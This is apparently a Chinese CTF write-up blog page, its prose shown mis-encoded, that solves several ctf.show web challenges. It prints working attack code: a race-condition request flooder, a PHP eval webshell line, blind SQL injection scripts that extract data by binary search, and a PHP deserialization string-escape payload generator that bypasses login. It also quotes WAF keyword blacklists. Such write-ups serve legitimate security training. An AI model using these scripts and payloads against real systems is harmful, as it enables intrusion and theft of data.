<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d6d06d87-f806-48a0-a282-a653e47e9fb6.challenge.ctf.show/check.php?token=70efdf2ec9b086079795c442636b55fb&amp;php://input&quot;</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except  Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as k:</span><br><span class="line">    data = k.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(500):</span><br><span class="line">    threading.Thread(target = POST,args = (data,)).start()</span><br><span class="line">    threading.Thread(target = POST,args = (&quot;test&quot;,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309232231933.png" alt="image-20230923222239758"></p>
<h2 id="çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹"></a>çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹</h2><p>å’‹ä¸€çœ‹æ²¡ä¸œè¥¿ï¼Œæ‰«ç½‘å‘ç°æœ‰gitæ³„éœ²</p>
<p>ç”¨githackå¤±è´¥äº†ï¼Œé‚£å°±æ¢ç”¨Git_Extractï¼ŒæŠŠgitæ‰’ä¸‹æ¥ï¼Œå‘ç°æœ‰backdoor.phpçš„åé—¨ä¸€å¥è¯æœ¨é©¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@eval($_POST[&#x27;Letmein&#x27;]);</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¿›å»æ‰“ï¼Œä½†æ˜¯ç¦ç”¨çš„å‡½æ•°å¤ªå¤šï¼Œæ²¡æ³•rceã€‚å…ˆè¿ä¸ªèšå‰‘æ‰¾åˆ°flagåœ¨&#x2F;var&#x2F;wwwä¸‹</p>
<p>å¯ä»¥ç›´æ¥ç”¨highlight_fileæ˜¾ç¤ºå‡ºæ¥</p>
<h2 id="èŒæ–°ä¸“å±çº¢åŒ…é¢˜"><a href="#èŒæ–°ä¸“å±çº¢åŒ…é¢˜" class="headerlink" title="èŒæ–°ä¸“å±çº¢åŒ…é¢˜"></a>èŒæ–°ä¸“å±çº¢åŒ…é¢˜</h2><p>å”‰ï¼Œæœ€ä½èƒ½çš„å¼±å£ä»¤ã€‚å¾—æ‰¾ä¸ªæ—¶é—´æŠŠå­—å…¸å¥½å¥½æ•´ç†ä¸€ä¸‹äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u=admin&amp;p=admin888</span><br></pre></td></tr></table></figure>

<h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><p>æ‰«ç½‘å‘ç°<a href="http://www.zip,æ‰“å¼€å‘ç°è¿äº†web15çš„æ•°æ®åº“,å‡½æ•°å¤§æ¦‚æ˜¯å…¨ç¦äº†/">www.zipï¼Œæ‰“å¼€å‘ç°è¿äº†web15çš„æ•°æ®åº“ï¼Œå‡½æ•°å¤§æ¦‚æ˜¯å…¨ç¦äº†</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\_|\+|\=|\]|\;|\&#x27;|\â€™|\â€œ|\&quot;|\&lt;|\&gt;|\?/i&quot;,$username))</span><br></pre></td></tr></table></figure>

<p>é‡Œè¾¹æœ‰ä¸ªuser_main.phpï¼Œä½†æ˜¯å¹¶ä¸ä¼šç›´æ¥ç»™ä½ æ”¾å‡ºpwd</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309241734589.png" alt="image-20230924173415512"></p>
<p>æ³¨æ„å¾—åˆ°ï¼Œæ‰§è¡Œçš„sqlè¯­å¥æ˜¯<code>select * from user order by $order</code>ï¼Œè€Œorderæ˜¯å¯ä»¥æ“æ§çš„ä½ç½®ï¼Œå½“ä½¿ç”¨pwdçš„æ—¶å€™ï¼Œå°±ä¼šä½¿ç”¨pwdæ¥æ’åºã€‚å¦‚æœå¯†ç æ’åº&gt;flagï¼Œæ’åºå°±ä¼šé ä¸Šã€‚è¿™ä¸ªæ—¶å€™å°±å¾—è€ƒè™‘ç›²æ³¨äº†</p>
<p>è¿™é‡Œç»™å‡ºäºŒåˆ†æ³•çš„payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">regurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/reg.php&quot;</span></span><br><span class="line">queurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/user_main.php?order=pwd&quot;</span></span><br><span class="line">key = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="comment"># æ³¨å†Œé¡¹ç›®</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> mid &lt; <span class="built_in">max</span>:</span><br><span class="line">        c = key[mid]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now playload:&quot;</span>, c)</span><br><span class="line">        raw_data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: flag + c,</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: flag + c,</span><br><span class="line">        &#125;</span><br><span class="line">        s = requests.session()</span><br><span class="line">        reg = s.post(url = regurl,</span><br><span class="line">                     data = raw_data,</span><br><span class="line">                     headers = &#123;</span><br><span class="line">                         <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">                     &#125;)</span><br><span class="line">        que = requests.get(url = queurl, headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        p_t = que.text.index(flag + c)</span><br><span class="line">        p_flag = que.text.index(<span class="string">&quot;flag_is_my_password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> p_t &gt; p_flag:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    flag = flag + key[mid - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”±äºå¾ˆå¤š&lt;&gt;ç­‰ç‰¹æ®Šç¬¦å·è¢«ç¦ç”¨äº†ï¼Œæ‰€ä»¥ç›´æ¥æŒ‡å®škeyã€‚è€Œä¸”mysqlæ’åºå¹¶ä¸æ˜¯æŒ‰asciiç æ’åºã€‚å½“å­—æ¯ä¸åŒï¼ŒæŒ‰å­—æ¯è¡¨é¡ºåºæ’åˆ—ï¼›å½“åŒå­—æ¯ï¼Œå…ˆå°å†™åå¤§å†™</p>
<h2 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=null;</span><br><span class="line">    public $nickname=null;</span><br><span class="line">    public function login() &#123;</span><br><span class="line">        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">        $mysqli=new dbCtrl();</span><br><span class="line">        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);</span><br><span class="line">        if($this-&gt;id)&#123;</span><br><span class="line">        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;  </span><br><span class="line">        $_SESSION[&#x27;login&#x27;]=1;</span><br><span class="line">        echo &quot;ä½ çš„IDæ˜¯&quot;.$_SESSION[&#x27;id&#x27;];</span><br><span class="line">        echo &quot;ä½ å¥½ï¼&quot;.$_SESSION[&#x27;token&#x27;];</span><br><span class="line">        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">        return $this-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public function update()&#123;</span><br><span class="line">        $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">        //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span><br><span class="line">    &#125;</span><br><span class="line">    public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        return file_get_contents($this-&gt;nickname);//å±</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;noob123&quot;;</span><br><span class="line">    public $dbpass=&quot;noob123&quot;;</span><br><span class="line">    public $database=&quot;noob123&quot;;</span><br><span class="line">    public $name;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$_POST[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$_POST[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;token=$_SESSION[&#x27;token&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            echo(&#x27;å¯†ç é”™è¯¯ï¼&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    public function update($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        //è¿˜æ²¡æ¥å¾—åŠå†™</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜æ¶‰åŠåˆ°äº†ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p>
<blockquote>
<p><strong>PHPåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œåªè¦å‰é¢çš„å­—ç¬¦ä¸²ç¬¦åˆååºåˆ—åŒ–çš„è§„åˆ™å¹¶èƒ½æˆåŠŸååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°†å¿½ç•¥åé¢å¤šä½™çš„å­—ç¬¦ä¸²</strong></p>
</blockquote>
<p>æŠŠ<a href="http://www.zipæ‰’ä¸‹æ¥ï¼Œçœ‹å¾—åˆ°åªæœ‰`$_SESSION[&#39;login&#39;]===1`çš„æ—¶å€™æ‰èƒ½å¼¹å‡ºflag">www.zipæ‰’ä¸‹æ¥ï¼Œçœ‹å¾—åˆ°åªæœ‰`$_SESSION[&#39;login&#39;]===1`çš„æ—¶å€™æ‰èƒ½å¼¹å‡ºflag</a></p>
<p>ä½†æ˜¯åªæœ‰User::login()ä¸­æ‰ä¼šå¯¹<code>$_SESSION[&#39;login&#39;]</code>è¿›è¡Œèµ‹å€¼</p>
<p>è€Œèµ‹å€¼çš„æ¡ä»¶å¾—æ˜¯token&#x3D;adminæˆ–è€…password&#x3D;æ•°æ®åº“ä¸­password</p>
<p>é€šè¿‡åˆ†æå¯çŸ¥ï¼ŒUser::login()å…¶å®å°±æ˜¯å†™æ­»äº†dbCtl::login()çš„æŸ¥è¯¢è¯­å¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡é“¾å­è‡ªå·±æ„é€ sqlè¯­å¥</p>
<p>UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__Call-&gt;dbCtrl::login()</p>
<p>è¿™æ ·å¦‚æœç¬¬ä¸€æ¬¡æ‰“é€šäº†ï¼Œä¼šè§¦å‘<code>$_SESSION[&#39;token&#39;]=&quot;admin&quot;</code></p>
<p>ç¬¬äºŒæ¬¡å†æ¬¡ç™»é™†çš„æ—¶å€™ï¼Œä¼šç›´æ¥åˆ¤æ–­dbCtrl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥ç»•è¿‡å¯†ç çš„éªŒè¯</p>
<p>å”¯ä¸€çš„é—®é¢˜å°±æ˜¯Infoåœ¨æ„é€ çš„æ—¶å€™å¹¶ä¸ä¼šæ„é€ $CtrlCaseï¼Œå¯¼è‡´æ— æ³•è¿›__callå‡½æ•°</p>
<p>ä½†æ˜¯safeå‡½æ•°å¯ä»¥å¸®åŠ©ç»•è¿‡è¯¥é™åˆ¶ï¼ˆå­—ç¬¦ä¸²é€ƒé€¸æ¼æ´ï¼‰</p>
<p>å°è¯•ä¼ <code>age=1&amp;nickname=2</code></p>
<p>ä¼ å‡ºçš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸º</p>
<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
<p>è¯´æ˜å¯æ§çš„åªæœ‰ageå’Œnicknameä¸¤ä¸ªå­—æ®µï¼Œæœ€åçš„CtrlCaseæ— æ³•ä¼ å…¥ã€‚ä½†æ˜¯ç”±äºsafeçš„å‡½æ•°çš„å‡ºç°ï¼Œä½¿å¾—é€ƒé€¸æˆä¸ºäº†å¯èƒ½</p>
<p>å½“ä¼ å…¥<code>age=1&amp;nickname=union</code>æ—¶</p>
<p>ä¼ å‡ºçš„ååºåˆ—åŒ–å­—ç¬¦ä¸²å˜æˆäº†</p>
<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
<p>è¿™æ ·<code>s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;</code>å°±å‡ºé”™äº†ï¼Œå› ä¸ºå…¶ä¸­çš„s:5ä»…ä¸ä¼ å…¥çš„nicknameçš„å€¼çš„é•¿åº¦æœ‰å…³ï¼Œè€Œhackeræ˜¯6ä½ã€‚è¿™æ˜¯å› ä¸ºsafeå‡½æ•°ä¼šæŠŠä¸€äº›å•è¯æ›¿æ¢</p>
<p>é‚£å°±å¯ä»¥è‡ªè¡Œæ„é€ ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²è¿›å»ï¼Œå¼ºè¡ŒæŠŠåé¢çš„CtrlCaseæ„é€ å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;nickname = new Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;CtrlCase = new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UpdateHelper&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;sql = new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl&#123;</span><br><span class="line">    public $name = &quot;admin&quot;;</span><br><span class="line">    public $password = &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$u = new UpdateHelper();</span><br><span class="line">$len = strlen(&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;);</span><br><span class="line">$payload = str_repeat(&#x27;union&#x27;, $len).&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±æ„é€ å‡ºäº†payloadï¼ŒæŠŠpayloadä½œä¸ºnicknameä¼ å…¥</p>
<p>ç”±äºsafeä¼šæŠŠunionä¿®æ”¹ä¸ºhackerï¼ˆå­—ç¬¦æ•°+1ï¼‰ï¼Œåªè¦æˆ‘ä»¬ä¼ å…¥ä¸€å®šé•¿åº¦çš„unionï¼Œå°±å¯ä»¥è®©<code>s:8:&quot;nickname&quot;;s:1920:</code>å…¶ä¸­çš„s:1920å…¨éƒ¨å˜æˆhackerï¼Œä»è€Œä½¿åé¢æˆ‘ä»¬è‡ªè¡Œæ„é€ çš„CtrlCaseé€ƒå‡º</p>
<p>å½“æˆ‘ä»¬ä¼ å…¥çš„sqlè¯­å¥<code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>ä¸ç®¡usernameæ˜¯ä»€ä¹ˆï¼Œå§‹ç»ˆè¿”å›1,c4ca4238a0b923820dcc509a6f75849b</p>
<p>è€Œåœ¨ä¼ å…¥payloadçš„æ—¶å€™å°±æŒ‡å®š<code>public $password = &#39;1&#39;</code>ï¼Œå°±å¯ä»¥é€šè¿‡<code>if (md5($this-&gt;password)!==$passwordResult)</code>è¿™æ¡è¯­å¥æˆåŠŸèµ‹å€¼session</p>
<p>åœ¨æœ€åæ·»åŠ ä¸€ä¸ª}æ¥æå‰ç»“æŸååºåˆ—åŒ–ï¼Œç”±äºååºåˆ—åŒ–çš„ç‰¹æ€§ï¼ŒæˆåŠŸåå°†å¿½ç•¥åé¢å¤šä½™çš„å­—ç¬¦ä¸²</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202310152238698.png" alt="image-20231015223831637"></p>
<p>æ‰“è¿›å»ä¹‹åæˆ‘ä»¬çš„$_SESSION[â€˜tokenâ€™]&#x3D;adminï¼Œå†æ¬¡è®¿é—®loginå°±èƒ½é€šè¿‡éªŒè¯å¼¹å‡ºflag</p>
<h2 id="Fishman"><a href="#Fishman" class="headerlink" title="Fishman"></a>Fishman</h2><p>è¿™é¢˜æœ‰ä¸€ä¸ªæ³¨å…¥ç‚¹å¯ä»¥æ‰“</p>
<p>ä½†æ˜¯æœ‰ä¸ªwafï¼Œä¼šéå†æ‰€æœ‰getï¼Œpostï¼Œcookieå‚æ•°ï¼Œåœ¨é»‘åå•ä¸¤ä¾§åŠ ä¸Š@ä»è€Œé˜»æ­¢æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$blacklist = &#x27;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#x27;;</span><br></pre></td></tr></table></figure>

<p>ä½†åœ¨member.phpä¸­æœ‰ä¸€æ¡json_decodeæ“ä½œï¼Œè€Œjson_decodeä¼šå°†ä¼ å…¥çš„unicodeè‡ªåŠ¨è§£ç ï¼Œè¿™å°±æä¾›äº†æ¡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($_COOKIE[&quot;login_data&quot;]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[&#x27;login_data&#x27;], true);</span><br><span class="line">        $admin_user = $login_data[&#x27;admin_user&#x27;];</span><br><span class="line">        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#x27;$admin_user&#x27; limit 1&quot;);</span><br><span class="line">        if ($udata[&#x27;username&#x27;] == &#x27;&#x27;) &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[&#x27;password&#x27;] . LOGIN_KEY);</span><br><span class="line">        if ($admin_pass == $login_data[&#x27;admin_pass&#x27;]) &#123;</span><br><span class="line">            $islogin = 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä»è¿”å›çš„setcookieæ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸï¼Œç»™ä¸ªpocè¿›è¡ŒéªŒè¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &quot;include/safe.php&quot;;</span><br><span class="line">var_dump($_COOKIE[&#x27;test&#x27;]);</span><br><span class="line">$login_data = json_decode($_COOKIE[&#x27;test&#x27;], true);</span><br><span class="line">var_dump($login_data);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311251444061.png" alt="image-20231125144412967"></p>
<p>è€Œmember.phpå¿…é¡»ä»common.phpé‡Œæ‰“ï¼Œæ‰€ä»¥å°±æœ‰exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">url = &quot;http://127.0.0.1:7788/poc.php&quot;</span><br><span class="line"># $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#x27;$admin_user&#x27; limit 1&quot;);</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    min = 33</span><br><span class="line">    max = 127</span><br><span class="line">    mid = (min + max) // 2</span><br><span class="line">    while min &lt; max:</span><br><span class="line">        payload = &quot;&#x27; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; #&quot;.format(i, mid)</span><br><span class="line">        cookie = &#x27;islogin=1;login_data=&#123;&#123;&quot;admin_user&quot;:&quot;&#123;payload&#125;&quot;,&quot;admin_pass&quot;:65&#125;&#125;&#x27;.format(payload = payload)</span><br><span class="line">        headers = &#123;&#x27;cookie&#x27;: cookie&#125;</span><br><span class="line">        re = requests.get(url = url, headers = headers)</span><br><span class="line">        setcookie = str(re.headers)</span><br><span class="line">        if setcookie.count(&quot;islogin&quot;) == 2:</span><br><span class="line">            min = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            max = mid</span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">    if chr(mid) == &quot; &quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="çº¢åŒ…é¢˜ç¬¬ä¹å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬ä¹å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬ä¹å¼¹"></a>çº¢åŒ…é¢˜ç¬¬ä¹å¼¹</h2><p>ç™»é™†å‘ç°é™¤äº†ä¼ usernameä¹‹å¤–è¿˜æœ‰ä¸ªreturlå‚æ•°ï¼ŒæŠŠreturlçš„å€¼æ”¹ä¸º<a href="http://baidu.comç›´æ¥å›æ˜¾äº†ç™¾åº¦çš„é¡µé¢,å¯èƒ½æ˜¯ssrf/">http://baidu.comç›´æ¥å›æ˜¾äº†ç™¾åº¦çš„é¡µé¢ï¼Œå¯èƒ½æ˜¯ssrf</a></p>
<p>çŒœæµ‹æ˜¯ä½¿ç”¨äº†includeè¿œç¨‹åŒ…å«æˆ–è€…curlå‡½æ•°ï¼Œé¢˜ç›®ç»™äº†hintæ˜¯è·Ÿmysqlæœ‰å…³ï¼Œé‚£å°±å¤§æ¦‚æ˜¯curl</p>
